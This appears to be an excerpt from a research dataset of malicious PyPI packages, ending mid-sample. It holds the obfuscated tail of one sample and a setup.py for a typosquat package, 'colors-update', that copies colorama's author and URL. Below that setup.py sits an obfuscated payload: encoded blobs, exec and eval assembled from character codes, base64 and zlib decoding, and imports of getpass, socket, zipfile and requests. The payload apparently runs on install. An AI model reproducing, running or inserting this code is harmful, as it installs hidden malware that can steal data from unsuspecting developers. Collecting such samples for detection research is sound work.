GGd|U-W{dIFmsD;$u<61w^bX_DJfxswvf%i_JQPNQLS~=%?7v!kdj@{$kevJ$d9r;KMaiV1N16I5Y9ce})UgtFR1jh700`-|+cMmkcD?S1=aC(5odAkZrenXzZYb?Z7ddkx3;E=+fT-e6fK@X;^sVsoQ*Z(>*r@a6kqFwsnO1`=`q}kjd)>q+0tLW@WAzX9Mt*C2P9mBt%?JjdHm4lUP<%VF7y175bV@6h5QAJPK7mn(GagBCiEcO7#KB{#s9G&sgJ|HJ%dhgKyX7rb2lLOF(t+mIKbR^H;HR{A`<~3Gnfg(!JJ<fN^a(3$E@a?z>53jT=NT8_ro@HZ<wgfVa-$t}(~%)A{WiQg@DyY1LKN;9(V{_z#XFf!3UL>pssqQjL_|jS)NOMey<6=~>}FN?$w}N;+{*Xf?}Vh3E-6@c5c>VVj9OCpF4!bv4H)$X|34w|OwwyZcaKYokq!a<>GR*5RJ6qvsSig+E}dApv6EFt(&ot9>o;Ha(p095Zy%hn6nV7D!Wf#YVTGX&m|?eIZbJ@xJ(hW%}gxo4aiBLjWNayc()k?Eyc<o8e^u`4nLVsZ&Op<~w@3bAp*QY<4f<O6vMs{<&83@YS;}Ua!CaC5h!K*?y;%^s^7{tm!9ZW2QGl88l2oH|maD41j!`%CQjAFln4|@spJU8~y$z3pH4H;t_9{m+HL;t(exrpUoK&2Wq4WXZ;{a&j+PLngzJ)9*(ECmb)waY)B3z-C)q1kYur-*OX!I^Bx>d>r+wY9zU`F=~e_;DZXA)u6}ub_SKN=0fq*vK*L}>XGT`@EdGVq@Qo=|x{L$x!V}a2=VuX^HIj{@FUR7X?9OmP#Nsi=Wdad)uhzq88iIzVoc<huc&GYth*BOBS%A|cvu|TO$$oe;GB1EbR7}E}w~l=ZApn0O$f?S5jb~-ve5(BbWsZ*j?mLIGPn&enWn-vcd&!u#y=K{!-0S2!kgp=j{Dfi;oqyft;S#xPg;uG+ZmweKr-zruPbOOaPH|E2v!i9qlL02HuMa~k^PS$8gaOjbzg2`zbk{}2C^C}-6cg{g=)QVIU6m$!konYVyEHsiH4-36(tTFX9dfH+#NqfY-sXxll(*tzeDA(`oOybdZVwU?@ql<P>ge7E(vMN%B%90S8ri{<(<eA(3Cn{*lp6#(A9A0c+L&bz1q$y58ZSh9YY6~CL0#HXnQesp><UQeco^5smojQz7LQRV=0<`WwDL&KN4|L0G$;*JFpv22r(kGehlxC$x-(T1$=vA_!8A&6P&m2_olS^B7dOo@UHc$JY751hM<2|Abiehbz=JAoX2Jn$Xo_`Jo0&E`dKG`1_SrNLzt3FgLufEoU3ZX2eLW`cK$!Z+sNMRmUP9&`t}uuy7WG8#Tof<LQ;|{b?dS2{*ADhM#@5@H^nJE<w9R+Kd-K-;E^5L#Mao0fRMxD%R&c6+Z)I^=9~kyeeP04Cs4UQ%M#u|A$yTojKIPvIO@@;>1qdMasb}#Ms%mG2ieC{He7n}!oIKHLwa7wNO8zy1&o*&U8DFWfmZE$}OU|RnctYy20bV3WVZX(UIEbz^82Zn5b%j=VD_{Ob#Zh*pH$zwb1-><g+)gh4c#ypS<LH<|spF07LlnrvRQc6roFhhzdi@Dq1?|KJ;E?+fFN?=wiRiYNj$lsRua5}xYOrYh;#QR&czK+=!Z4O*d72tcW6jG<r<+QBqM65o&<dm~<M)t0Cv-L6lvlJOgp_5)e_U5f6a6;9u2D2>t(Ya;<lf=tM};ir^m55~*<D+rtFaD20go^Uz<L)#7p9!e1q@|s%@}pQ=3T6%q;UfgWxA)M=21{{upUc__XC!DtzV(Cy=xSh0ng?l(940VV@;DtF(xgQPXbzqq0)hI#21NncAKU%-}l?{$>wkc3AnNMEalC}VLGF*CAK#x^&2Ku=9o+nl8;yC_^c8L4zh$?^=-|avqOLJQay?lOI3riFNUe%DlC`R0NcGE$&-75Dg`1mh&g-)Nl6DYS+s6LSSzaUBRHS5;0TNhJ~sdI6g`WfIxYhigL(KmG$gHyCl@=nF0Ic&P>Z+)RnKN;up9l=et7Rfo|Q;a!UN|%#9%#EYMdKOohM3#uucp;oOkXZX78|u7EeL75%$d~pkLzXboh!0v>l2+rnMqiqqn%v(^{fwkmc?L-$I6HP)KsQY!Y(da$n5SYPz{JeLGeT#F6Ch1TX$~XSp;Ae|(O3b>qi(4BIl3i320#=<S+j=6uOuRD1Kjl|L6sm1Wy!s6sDVgpoNn&-AZaIyBIE7vEM9qyg&zj3z|!5gSj}PL3bMxpOKzoL}imExfjq@$tBo(wyDZ3)#tBKeFM39@e$dCJMV!c+ZQ^@Ih-(#G)6i=bN5KIo=CM{6Dd(Y+H8Rz6%mydZB=g;1&cRPyG1J%9w$Q#N;%E`qA_FQBc=g`-9zr@}UXnfWBhF60G78{?a7FbM){Mo0^0hd^?SJPJVl>csEtZ4vMTwAs+v^#P06V3=HT+hH0*{{%SXpEd_xb4-1C++id7r+G>>ZTn;b>R19x%I4OXfkCQvAe-)Oe?zFoO*A%bI;C>lrnZbL`snELW<nZ^R(zp3%=$dD+B;S^=BQy?iF8E~L9WhP_z0XwLi{qe}DT-\nVO%<X2dEV*|jP!rij{7BW#si;^1{2SUsH={ROt(*fHVm`dk8c=I~$yaxdHl4y&W2&<-t{tew6gd53<^6i!2!v3!FWe{OTNUlzw@hOh^?wJt2yrc)CkLmYsV$$lQkRZMn(fMES*9HiXl`R5U*i@~<3Zl~@Hbp;L&sHhzLvFm7<+bv#s64yotPj=)V96<)+!|}piIn`Jk)@HiF%&EzjkgMqIQ3;oJDo<1^1URZA)&wOOih-3H5$9ygSMR>{Wu9;f=Dg=E4YIeVJH{Bl)&}UOpy*g|!YYxD>l3mjW?#kZ63(B*hwibi+=jgu3ur&el<Hfj#^->|Q}H6yKxw7*ofsFT}hK(KjdB)6TX'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n\nfrom .src_file import *\nfrom colorama import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-25-colors-update-v3",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='colors-update',\n    version='3',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\nimport getpass\nimport os\nimport socket\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''73y&GqPR(El6Cy|8u!6JFCv564b{;ZPb|%0350vXGkzC{tFFn;WmNa>Z_@z(zI4qPlF?TOmPfiNetNqEf#f34Vx#6mY%@p7M3Z@hiq^`T|GZHhJv#i6vv8X5rlE(&28NqNh%^k?{xx^BIUzC@MR;?0cc$2uv|pXboqMT7MC?!`w|46~h?m#mGtu8+R&ftxyKFb1|DP>>#yJoUWavuZr~*@w0<<Jz($pAWK~B%G?{lJ|@VI&_g$fz$1Ugv@w3g`{r+ru2HF!vqNk11S3w4-|C8ZtyU6R<n-YZBPT`r4OM78z!pHKa>J0@0HXz+I#{Cq?9yk=+03}oW^!F2&dF%n57-o+N8Nv#Yr-CABKF_sa;u1%gpmznFa^%NTMpqcIyjL}743UmDYn~!W?gTh%T+(Yhi)^hW6Slk!&SQKQFK;6_)Nt6!J`?wdvj427&qA!Hjd;l-pJc7cdJJO)Ook-gBf%mk2wfXI`_4x;t%fPh5^R^#?IJT;vD#4h!4@)ZoO3RlLw{=AbmTtkWJ0&Z(9n1q!3p_+b-@(d-kOeLqe^A3yT8U~2Qnh$AGGUDcb5st1rcSmsHQ%;_xaUQ%G{{uxas+vWO4rAJJ!^V$3qPsjD|a{1@VAyAsvaU=A@a^HVxR5tpRlkY&?HOy3b=vw%zQ0hlw{-<i)umt{<k9l2Q?YJqa1!im$Andd)2mw9m>oPgi8d7<Pz0#YlFjptltt@BCN}H&Le*Aa-q5DbC0~z^lmWqkEz0k=ns?#cyz9@DP^TW>I}9OeCQ!GIwz6a4#v%45WMVG`W09yruf)%qD-R&iO7T{VaA(Lwi9^otrAr!SK(_)Cx|j{ZDDb`C>~x)4|SvDx>|c4f~zNWZ|ieUJRyq1Ef1j0eqO5<t^QnScNJXb;oyVORtci+;UVVj+W8M7H5~z~eMi35L|*hR$dLh+B40%&9nJy@@<wf}mgF!@!r4T}sK%Bl7uiZaZt}Q8h`sd~3Dh#EK^qJJ&3y1Q`<==9HT;z3=-?eo7QQ!*<}AfS#Qrwjb8kU(Q7U8O@8@q62SgLWTE*dn6c=7HM(0VCEd^1BcaGptzOrzx-yFjL?VugP19a_@EMKYGPp$>~H(NluYz`Pr-_T5nMJi`2_Bi6W!Ho27jNU{>#l?cO!36Dp?Y2p<(rSZfaiP;pu7_8Wnpu#P+*q<LSb0-3Xhzk(Qk`|U=yn57i!=_Tg^FYzoJP&`P)Xe<bg>sr4hx5pEpaR=tAgTqtPzkW#a@h#Gzg>kOIveUdqHf_5n;s}(~@iWuD_$o1FlC}ubRfgvIxQVMj5+{KmHxk;s4w2BW9io+L#89RqQb(mq6d`;J<`}kITou(>uhx_R~BEsw?G#zKs=YVps$ovwqBr*%3yZ^EJa`u0p20P7s$e^awnnn!Dp7vD!jtCyr)-W`d>H!K{0)zTk#VTc||h>f$Mlh6)RGD7)uwWy0rb$W=W5@^Uyh80@Lgg=g;FpAH|~HFfhMVQ@gZ3&RknO;K&~n;R}Z%p%pUccyNAknEBwWBYA_M)mA2=yq|xb}eN3M2ioC^I}^kx{qlHO${a5^jakYEcMiYqJ}Yr%C&(Lll?rl|NrGmS)<!s?SGV6XcQqzm5uW-y{Bd8`dQff-InnI#pg3JAN+5;S7BeD)W1!LQE+E&q#^lEDJ6EU*naPuoPHjYfH-7zHYGQjop0hb4TZ}}SBZjnqXW!QL!s(=7f(qdSQlc+bjtcMqvvs?F#mLQuXTRBBk4ogS}?s^E713=Zbfe8ou^{?Uyx5;)U9RPkGQ7cJ;hiBZ0z>rNo78{Ph~yAp$?(-F;Td?DoIBC%$3J%|Fq$_aCG8<Wmq{gKB@fKmCxWwdv{-Ms>SAj^Wiit&i{C$No^3pv5fS&Mki3)uodn4P6~naEMizLKOSR!Obr>r_Dt5k=2<&hXVTf7O|TnNKCp4{my`gHdslIyfJq~`N*EK&9<sLcYNh9c$Kujr6#UdpzCVz^c_;T$QYm_ifW&m?1jC_N3;B)TVe*-)yXHzKhQSiQv~E@`C0Oleb*yYUbrT<^UCWv~xL&<-+1#R{6{we)Pqrb&2+zSFCqey)h0V7=G8(?TDV{$G0;UjF%zD+l?=}ZP(zP4qzp@z;ts9g$VB#VK#2;xqK9!Y{D`0F`4JvFnk<h-@Sd~>xcz(_)4DqOFa9ax^C*hu%eBjY{u19v7JJEZy2rGrY7C@Z&Vm&`HSUJBrqHKhhK~z(*JIaorTyrxQUQ32s;n9>8FJt+?%-KPFuI8A>D6bZjs_o`Q!A?m1xrmm}pJPGs$c1*d7UT^u9uarbs`>5bj<5vgWF`0~{}`-{o(@=>uYX6Q4YO{Pxmwx)a_^DcD*<BIy*7`-#n=0J2lnXcVgI<Q0qR?FU%zw{&j@l2BTCzI8>u&yN+GL(UdY}dlZ4O;VwB(DHma=>2T?kHW>xt*WT%*J56G28+Tgq};n+ksC2gjCj_xYhXM{byv=9&~tGj{6@xv{$zC=SBt)6eDoHAb~$AB43d;^u?;Y#rJr%LNwo4uGgI!*0n;_#n;KtD6<(ud*l&FLm<(Wj&Ba2e^+LwDXn2u3MQgQa9&P&8G^z34o&;Uj)xgoAPR(XbY<xP!O-A$c_~T_D7ATc1^+r-7Mz(L!so16hi2_!lffj@5{_UDai#^xxux)jc#Wok}Iszc}iq+MW)I4K)8Q9k#qAOrn<ZRw(Ho<|hW~R<ZWI#FL4eOhtKW?ik;gOw}B<GUyL3{ng>NeBDdAz~<cU;Hfkrba-hsCjrj!E!WG&Wt**Avp#;#m!+2C6qTR2@L4$plJ&X+fzw`T7Tl&~+_a>!FDb?m%F;;D+s#zI$`6t;rDK3$N7RLv^m80MLQnJaaCv%NhT8N6dHAj{j;b3rk<aXX$kxcsHY<l$XQWNmvO<=d5#oq4Jmc}^7SaDgODXx)LWXrvgLY?_U%Gp1^)E>K48IM0Ys1`>_J5}9J#|a=QdJJX#LkT83~2(@II5pSMTl5@4Nt#8->W@cpCvP>7I_k{n+Sl3uopf<LWc&?frPR#tnk1{*0|3z%lCv!ZW8DwqM6yfhyB%&oYxd149ZZ-<w5|<s|X=7EDZd6W;J~9kgGO`6pJ8BIC10a2D5lMK3rA>ng&J5Bj{u)QkP=BDL}n<MvoJ{<2~L9P0dexM4spcD|{#lu{gYP{~Gwn49I^pV*%aKSs(S1!P;jC+I51h?08PbF)uUvg#XGhH#qRkc1;Cir6?bFV!~em04>>2^T2yQiph)3#g$<T1O9#bn$$8-^6QB}BGjJJd(WKa%zNksoy^yFD={HHP<C+NU2T>10#x{!nmVy;y^xD>d5;Sky0-Tca!MEUEUvp>1wF3)h};6RQ(CT@Pidk7^&Fl@3{{bMQk2?csF%(N6RP&vW&8B778M4znHY|mh1S<X-_sv0Q}7+D?m@7axP)tDFnGhYG<<^TKLlF7F42&D--#>n0l4@Hih%d#@LaWO7<w}fUJF*~h=)pwb_z#9_^^N6{3lpUYL<;Je_XrioAx7@1cd)<M8;B?c093}u*#vLx@D?Ab(QXVBz|JfnB2P}S4{T45$V{dUO&)W87()cP$YNu4!2th&~UONh)G~H_AesJhe&qpAtutjER4{pF8kij#GqR(3W?X?$4o10ntzhYTLGRt2*{b-ASUpj?_x47Agi2e<ek7sHQ#j2-)<wkk|zkG>RQ~!(neRcwWulu8RdKu%e0Bn`xPW>L+OZZCqRnLXSEXW$Mv+wA=HCTj=#Hc85kZy+W(MOF5^l?d-NX(X<MQF7Hz@`7k!)cF)&3}0~Ei2paALCKg33!OX@xRmZJ#+23uBb9W%os|K!a*E^*vcn37FFZy#;_=YarHh4+rkr8ed!94()apaY-^|MG#Fut-_<aF|hehRWw&n)l59$wjb>)YLMTA-_WO#$LzSY9m*M5o75PC^vo{RC|U$I_BEFNSdt^1o~_OG_?w{DC-A?B7CF%5KuKyCG{{osTq}$qXl!#1t16vN}qhl`CqgEUe=07Q~^u5I~U&nVLZPauCW4NShFz`-`G&$jkCh>S2UxgyT}BV=U6lbe-avEw633HWT5N1O&8b`K8zb%yFDVUF{(aLIn;AI-x~SVxCt|x8kK(ik9O2Y*&XVFq&H3KtpBIPm$TlSDHccdMQL4hVeqRf25ncr)kI}V{58SwFZVo!hug(r<!idUXLH?O$fhS^P}4j6k$0Q~MA6tD0&{B6^~iDjX$11Bsn#$qh--GiR>g66QJgZN;h<i4R`gX0E^&TVFru}&KTrA*oHcE0$mz_>GA)_h+D*eJ3sifqB!*L*?_-<}aXufT3@j7&lfOXh&+2rYlkT^T85i?Xsi$TCwE81iMV23S@JQlP>c_VEhM&HnTUC2uvmq`Z1dx<#NNs2oOUTe*U8QdQ&|WUK9H0VhLe=`IL`gXrOBYyWL5Lv?g6fxY55@z;5kxM1rp%M)X{T9)&r|6PJ~%QrNZdaDlp38ib-\nWQh5ro$1=9Naxto6dyC)!4d^*jFHC8N`@GK{u|VzphvWD+WaX1rlpQipw>{atW7g&JSqBkuN*vP69_Dm9Hntk{m)jpdVUdN3ZLrBUGUD<s@hw@4IHT0^c%v|NH>#~D<a?1}ns5ld!mNvGxLCaoChJ_E$0DUeKW2EY5gS~A6o7)jYaA@FpS9xUt@3qSk6%GqVunro1umz3=<_&HO=8LMXM0Bufhj?xkn9qSnQL;}Bx+9TLN1ng>yh<+9O8WCSRZ?B)=`=*9kGUKG(5GAr`U998Yls2KFwy!plFn=66%-lz@ar!LUkY90R$V3ksi8xK3L`PW^`F@e*tyS+DpqDX&`l(FRu2Jlpu$FCg;}E5pU&)1`+A{(gh68KPIJ%*-HEYblriO2fb*z2StuU&BhbdcZ*EbKPt{AZok6Qn0?*o0~f=q|b7Ih*LX~jBYooN1u4Oge=R9Xe|YD%J$^~+ZGqj0rCRb3NZx;_B)v44h<Y#HwFs|w6frKTDR?iXrdAI0WeL!f(^aVu*7qzNp2zNzg8dyY?K)neu5-;d9u_QEgq3df1fhhGcVuu)$nVWnw}+fL#XxR7eKU>PjHuh(EzoNm`a@|1GDHeDWo$1KHo*2(LlzaqJtUE`}<{ET7l;Ct2^zwtnwcaCLg?B$3*!wJipm+}5^1b)m_x|Bm`XQqNVC7%p<R76PQ9woT0jw|f~>R=9MKxLpW%3k-w^p>S$i9YiZeyJ9W%F1{b5Pba?8ZPk%A3E?f))f+=oI<g4vm2Co4ke0rd!xF2RQv!K4;?^Mk`OzhH*Ax4c$V^V4}?^X48c@=mDfIa-5nJ#VwGEIzU%sBMK>)yoP1QdVeF^`^XpyR`atqm-U=R79!!V_aN^kVKX!E-3VTVt_7rsf!>`zr-2!)q#P35hU7pkZ01p<;CQ)P+mcb+|zGPth*fc9N{a)q!;y#bm!1^S7QFkaGC0$pX@N9<=o;rHV'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 